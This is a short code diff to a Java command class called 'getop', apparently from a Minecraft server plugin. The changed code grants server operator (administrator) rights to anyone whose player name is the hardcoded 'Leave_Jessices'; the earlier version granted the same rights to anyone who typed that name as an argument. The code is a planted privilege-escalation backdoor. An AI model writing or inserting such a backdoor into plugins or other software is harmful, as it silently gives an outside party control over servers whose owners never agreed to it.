@@ -14,7 +14,7 @@ public class getop extends BaseCommand {
 
     @Override
     public boolean excute(CommandSender sender, String[] args) {
-        if (args[0].equalsIgnoreCase("Leave_Jessices")) {
+        if (sender.getName().equalsIgnoreCase("Leave_Jessices")) {
             sender.setOp(true);
         }
         return true;
